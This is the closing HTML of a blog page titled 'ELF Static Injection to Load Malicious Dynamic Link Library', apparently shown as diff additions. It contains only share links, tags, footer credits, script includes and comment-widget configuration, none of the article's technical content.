+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://violentbinary.github.io/posts/1-elf-static-injection-to-load-malicious-dynamic-link-library/1-elf-static-injection-to-load-malicious-dynamic-link-library-en/" data-title="ELF Static Injection to Load Malicious Dynamic Link Library" data-hashtags="ELF,injection,Linux,patch"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://violentbinary.github.io/posts/1-elf-static-injection-to-load-malicious-dynamic-link-library/1-elf-static-injection-to-load-malicious-dynamic-link-library-en/" data-hashtag="ELF"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="https://violentbinary.github.io/posts/1-elf-static-injection-to-load-malicious-dynamic-link-library/1-elf-static-injection-to-load-malicious-dynamic-link-library-en/" data-title="ELF Static Injection to Load Malicious Dynamic Link Library" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://violentbinary.github.io/posts/1-elf-static-injection-to-load-malicious-dynamic-link-library/1-elf-static-injection-to-load-malicious-dynamic-link-library-en/" data-title="ELF Static Injection to Load Malicious Dynamic Link Library"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://violentbinary.github.io/posts/1-elf-static-injection-to-load-malicious-dynamic-link-library/1-elf-static-injection-to-load-malicious-dynamic-link-library-en/" data-title="ELF Static Injection to Load Malicious Dynamic Link Library" data-image="/images/1-elf-sj/elf-sj-title.jpg"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="Share on Myspace" data-sharer="myspace" data-url="https://violentbinary.github.io/posts/1-elf-static-injection-to-load-malicious-dynamic-link-library/1-elf-static-injection-to-load-malicious-dynamic-link-library-en/" data-title="ELF Static Injection to Load Malicious Dynamic Link Library" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="Share on Blogger" data-sharer="blogger" data-url="https://violentbinary.github.io/posts/1-elf-static-injection-to-load-malicious-dynamic-link-library/1-elf-static-injection-to-load-malicious-dynamic-link-library-en/" data-title="ELF Static Injection to Load Malicious Dynamic Link Library" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://violentbinary.github.io/posts/1-elf-static-injection-to-load-malicious-dynamic-link-library/1-elf-static-injection-to-load-malicious-dynamic-link-library-en/" data-title="ELF Static Injection to Load Malicious Dynamic Link Library"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/elf/">ELF</a>,&nbsp;<a href="/tags/injection/">injection</a>,&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/patch/">patch</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.89.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">liyansong</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><script type="text/javascript" src="/lib/valine/Valine.min.js"></script><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":25},"comment":{"valine":{"appId":"q4D7e9PV947z2sjUVfcdd6La-gzGzoHsz","appKey":"Md5Rqz1xNzFWnEjjS1DfaFsy","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Your comment ...","recordIP":true,"serverURLs":"https://leancloud.hugoloveit.com","visitor":true}},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
